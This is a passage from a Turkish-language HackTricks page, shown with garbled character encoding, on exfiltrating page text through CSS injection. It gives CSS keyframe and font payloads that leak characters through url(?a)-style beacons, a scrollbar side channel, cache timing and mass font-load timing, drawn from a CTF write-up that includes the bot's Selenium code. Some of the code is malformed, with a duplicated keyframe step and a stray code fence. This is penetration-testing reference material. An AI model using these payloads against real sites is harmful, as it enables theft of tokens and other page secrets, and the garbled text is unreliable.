0% { font-family: rest; } /* delay for width change */
5% { font-family: has_A, rest; --leak: url(?a); }
6% { font-family: rest; }
10% { font-family: has_B, rest; --leak: url(?b); }
11% { font-family: rest; }
15% { font-family: has_C, rest; --leak: url(?c); }
16% { font-family: rest }
20% { font-family: has_D, rest; --leak: url(?d); }
21% { font-family: rest; }
25% { font-family: has_E, rest; --leak: url(?e); }
26% { font-family: rest; }
30% { font-family: has_F, rest; --leak: url(?f); }
31% { font-family: rest; }
35% { font-family: has_G, rest; --leak: url(?g); }
36% { font-family: rest; }
40% { font-family: has_H, rest; --leak: url(?h); }
41% { font-family: rest }
45% { font-family: has_I, rest; --leak: url(?i); }
46% { font-family: rest; }
50% { font-family: has_J, rest; --leak: url(?j); }
51% { font-family: rest; }
55% { font-family: has_K, rest; --leak: url(?k); }
56% { font-family: rest; }
60% { font-family: has_L, rest; --leak: url(?l); }
61% { font-family: rest; }
65% { font-family: has_M, rest; --leak: url(?m); }
66% { font-family: rest; }
70% { font-family: has_N, rest; --leak: url(?n); }
71% { font-family: rest; }
75% { font-family: has_O, rest; --leak: url(?o); }
76% { font-family: rest; }
80% { font-family: has_P, rest; --leak: url(?p); }
81% { font-family: rest; }
85% { font-family: has_Q, rest; --leak: url(?q); }
86% { font-family: rest; }
90% { font-family: has_R, rest; --leak: url(?r); }
91% { font-family: rest; }
95% { font-family: has_S, rest; --leak: url(?s); }
96% { font-family: rest; }
}

/* increase width char by char, i.e. add new char to prefix */
@keyframes loop {
0% { width: 0px }
1% { width: 20px }
2% { width: 40px }
3% { width: 60px }
4% { width: 80px }
4% { width: 100px }
```css
5% { width: 120px }
6% { width: 140px }
7% { width: 0px }
}

div::-webkit-scrollbar {
background: blue;
}

/* yan kanal */
div::-webkit-scrollbar:vertical {
background: blue var(--sÄ±zÄ±ntÄ±);
}
```
### Metin dÃ¼ÄŸÃ¼mÃ¼ sÄ±zdÄ±rma (III): varsayÄ±lan bir yazÄ± tipiyle Ã¶ÄŸeleri gizleyerek karakter kÃ¼mesini sÄ±zdÄ±rma (harici varlÄ±klar gerektirmez) <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**Referans:** Bu, [bu yazÄ±da baÅŸarÄ±sÄ±z bir Ã§Ã¶zÃ¼m olarak belirtilmiÅŸtir](https://blog.huli.tw/2022/06/14/en/justctf-2022-writeup/#ninja1-solves)

Bu durum, Ã¶ncekine Ã§ok benzer, ancak burada belirli karakterlerin diÄŸerlerinden daha bÃ¼yÃ¼k olmasÄ±nÄ±n amacÄ±, bir dÃ¼ÄŸmeye bot tarafÄ±ndan basÄ±lmamasÄ± veya yÃ¼klenmeyen bir resim gibi bir ÅŸeyi gizlemektir. Bu nedenle, eylemi (veya eylemin eksikliÄŸini) Ã¶lÃ§ebilir ve metin iÃ§inde belirli bir karakterin var olup olmadÄ±ÄŸÄ±nÄ± bilebiliriz.

### Metin dÃ¼ÄŸÃ¼mÃ¼ sÄ±zdÄ±rma (III): Ã¶nbellek zamanlamasÄ±yla karakter kÃ¼mesini sÄ±zdÄ±rma (harici varlÄ±klar gerektirmez) <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**Referans:** Bu, [bu yazÄ±da baÅŸarÄ±sÄ±z bir Ã§Ã¶zÃ¼m olarak belirtilmiÅŸtir](https://blog.huli.tw/2022/06/14/en/justctf-2022-writeup/#ninja1-solves)

Bu durumda, aynÄ± kaynaktan sahte bir yazÄ± tipi yÃ¼kleyerek metinde bir karakterin olup olmadÄ±ÄŸÄ±nÄ± sÄ±zdÄ±rmayÄ± deneyebiliriz.
```css
@font-face {
font-family: "A1";
src: url(/static/bootstrap.min.css?q=1);
unicode-range: U+0041;
}
```
EÅŸleÅŸme varsa, **font `/static/bootstrap.min.css?q=1`** yÃ¼klenir. BaÅŸarÄ±lÄ± bir ÅŸekilde yÃ¼klenmese de, **tarayÄ±cÄ± bunu Ã¶nbelleÄŸe almalÄ±dÄ±r**, ve eÄŸer bir Ã¶nbellek yoksa, **304 not modified** mekanizmasÄ± vardÄ±r, bu yÃ¼zden yanÄ±t diÄŸer ÅŸeylere gÃ¶re daha hÄ±zlÄ± olmalÄ±dÄ±r.

Ancak, Ã¶nbelleÄŸe alÄ±nmÄ±ÅŸ yanÄ±t ile Ã¶nbelleÄŸe alÄ±nmamÄ±ÅŸ yanÄ±t arasÄ±ndaki zaman farkÄ± yeterince bÃ¼yÃ¼k deÄŸilse, bu iÅŸe yaramaz. Ã–rneÄŸin, yazar ÅŸunu belirtti: Ancak, testlerden sonra, ilk sorunun hÄ±zÄ±n Ã§ok farklÄ± olmamasÄ± olduÄŸunu ve ikinci sorunun botun `disk-cache-size=1` bayraÄŸÄ±nÄ± kullandÄ±ÄŸÄ±nÄ±, bu gerÃ§ekten dÃ¼ÅŸÃ¼nceli olduÄŸunu buldum.

### Metin dÃ¼ÄŸÃ¼mÃ¼ sÄ±zdÄ±rma (III): yÃ¼zlerce yerel "font"Ä±n (harici varlÄ±klar gerektirmeyen) zamanlama yÃ¼klemesiyle karakter kÃ¼mesini sÄ±zdÄ±rmak <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**Referans:** Bu, [bu yazÄ±da baÅŸarÄ±sÄ±z bir Ã§Ã¶zÃ¼m olarak belirtilmiÅŸtir](https://blog.huli.tw/2022/06/14/en/justctf-2022-writeup/#ninja1-solves)

Bu durumda, bir eÅŸleÅŸme gerÃ§ekleÅŸtiÄŸinde, aynÄ± kaynaktan **yÃ¼zlerce sahte fontun CSS tarafÄ±ndan yÃ¼klenmesini** belirtebilirsiniz. Bu ÅŸekilde, bir karakterin gÃ¶rÃ¼nÃ¼p gÃ¶rÃ¼nmediÄŸini **Ã¶lÃ§ebilirsiniz** ve bunu ÅŸu ÅŸekilde bulabilirsiniz:
```css
@font-face {
font-family: "A1";
src: url(/static/bootstrap.min.css?q=1),
url(/static/bootstrap.min.css?q=2),
....
url(/static/bootstrap.min.css?q=500);
unicode-range: U+0041;
}
```
Ve botun kodu ÅŸu ÅŸekildedir:
```python
browser.get(url)
WebDriverWait(browser, 30).until(lambda r: r.execute_script('return document.readyState') == 'complete')
time.sleep(30)
```
EÄŸer yazÄ± tipi eÅŸleÅŸmiyorsa, botu ziyaret ettiÄŸinizde yanÄ±t sÃ¼resinin yaklaÅŸÄ±k olarak 30 saniye olmasÄ± beklenir. Ancak, yazÄ± tipi eÅŸleÅŸmesi varsa, yazÄ± tipini almak iÃ§in birden fazla istek gÃ¶nderilir ve aÄŸ sÃ¼rekli olarak aktif olur. SonuÃ§ olarak, durdurma koÅŸulunu karÅŸÄ±lamak ve yanÄ±tÄ± almak daha uzun sÃ¼rebilir. Bu nedenle, yanÄ±t sÃ¼resi, yazÄ± tipi eÅŸleÅŸmesinin olup olmadÄ±ÄŸÄ±nÄ± belirlemek iÃ§in bir gÃ¶sterge olarak kullanÄ±labilir.

## Referanslar

* [https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e](https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e)
* [https://d0nut.medium.com/better-exfiltration-via-html-injection-31c72a2dae8b](https://d0nut.medium.com/better-exfiltration-via-html-injection-31c72a2dae8b)
* [https://infosecwriteups.com/exfiltration-via-css-injection-4e999f63097d](https://infosecwriteups.com/exfiltration-via-css-injection-4e999f63097d)
* [https://x-c3ll.github.io/posts/CSS-Injection-Primitives/](https://x-c3ll.github.io/posts/CSS-Injection-Primitives/)

<details>

<summary><strong>AWS hackleme konusunda sÄ±fÄ±rdan kahraman olmak iÃ§in</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>'Ä± Ã¶ÄŸrenin</strong>!</summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* Åirketinizi HackTricks'te **reklamÄ±nÄ±zÄ± gÃ¶rmek** veya **HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* Ã–zel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluÅŸan koleksiyonumuz [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'i keÅŸfedin
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna **PR gÃ¶ndererek** paylaÅŸÄ±n.

</details>
